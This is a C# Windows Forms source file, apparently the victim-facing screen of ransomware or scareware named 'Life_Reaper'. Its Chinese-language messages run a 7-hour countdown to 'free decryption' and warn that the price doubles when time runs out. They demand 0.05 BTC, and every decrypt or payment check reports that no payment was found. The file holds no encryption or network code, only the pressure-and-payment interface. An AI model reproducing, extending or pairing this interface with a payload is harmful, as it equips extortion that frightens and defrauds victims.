using System.Drawing.Drawing2D;

namespace Life_Reaper
{
    public partial class Form1 : Form
    {
        private TimeSpan timeLeft;
        private Point mouseOffset;

        public Form1()
        {
            InitializeComponent();
            timeLeft = TimeSpan.FromHours(7);
            UpdateCountdownDisplay();
        }

        private void TimerCountdown_Tick(object? sender, EventArgs e)
        {
            if (timeLeft.TotalSeconds > 0)
            {
                timeLeft = timeLeft.Add(TimeSpan.FromSeconds(-1));
                UpdateCountdownDisplay();
            }
            else
            {
                timerCountdown.Stop();
                lblCountdown.Text = "00:00:00";
                MessageBox.Show("时间已到！价格已翻倍。", "时间到期", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
        }

        private void UpdateCountdownDisplay()
        {
            lblCountdown.Text = timeLeft.ToString(@"hh\:mm\:ss");
            lblTimer.Text = $"免费解密剩余时间：{timeLeft.ToString(@"hh\:mm\:ss")}";
        }

        private void BtnDecrypt_Click(object? sender, EventArgs e)
        {
            MessageBox.Show("未检测到付款。请先发送所需金额。", "解密失败", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }

        private void BtnPay_Click(object? sender, EventArgs e)
        {
            MessageBox.Show("请发送 0.05 BTC 到上方地址。\n付款后，点击\"检查付款\"进行验证。", "付款说明", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void BtnCheckPayment_Click(object? sender, EventArgs e)
        {
            MessageBox.Show("尚未检测到付款。请等待区块链确认。", "检查付款", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void BtnMinimize_Click(object? sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        private void BtnClose_Click(object? sender, EventArgs e)
        {
            Application.Exit();
        }

        private void PanelTitleBar_MouseDown(object? sender, MouseEventArgs e)
        {
            mouseOffset = new Point(-e.X, -e.Y);
        }

        protected override void OnMouseMove(MouseEventArgs e)
        {
            base.OnMouseMove(e);
            if (e.Button == MouseButtons.Left)
            {
                Point mousePos = Control.MousePosition;
                mousePos.Offset(mouseOffset.X, mouseOffset.Y);
                Location = mousePos;
            }
        }
    }
}
